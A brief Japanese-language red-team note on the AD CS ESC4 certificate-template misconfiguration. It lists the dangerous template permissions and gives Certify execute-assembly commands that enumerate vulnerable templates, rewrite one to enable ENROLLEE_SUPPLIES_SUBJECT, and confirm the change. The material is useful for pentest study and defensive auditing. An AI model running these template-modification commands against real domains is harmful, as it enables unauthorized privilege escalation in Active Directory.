証明書テンプレートに対して、低権限ユーザが変更できる状態（寛容なACE）が存在する場合に、証明書テンプレートを脆弱なものに改変できてしまう

主に5つの権限が危険
- Owner : テンプレートの所有者になっている状態。テンプレートのアクセス制御を変更できてしまう。
- FullControl：テンプレートに対する完全制御が可能な権限。
- WriteProperty：テンプレートの属性（EKUやSAN等）を変更可能な権限
- WriteOwner：テンプレートの所有者を変更できる権限
- WriteDacl：テンプレートのアクセス制御を変更可能（FullControl等にできてしまう

## Enumeration
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

## Exploit
Certifyの`manage-template`を利用する方法
- `enroll <sid>`でSIDに対象のプリンシパルを設定
- `--manager-approval`でマネージャー承認を切り替え
- `--authorized-signatures 0`で署名の数を0にする
- EKUを設定する
	- `--client-auth`
	- `--pkinit-auth`
	- `--smartcard-logon`
- `--supply-subject`で`ENROLLEE_SUPPLIES_SUBJECT`フラグを切り替える

## Exploit例
この例ではEKUに`Client Authntication`が設定されているため、`ENROLLEE_SUPPLIES_SUBJECT`フラグだけ切り替えてESC1を模倣する
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
```

フラグを確認
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --template ESC4 --quiet
```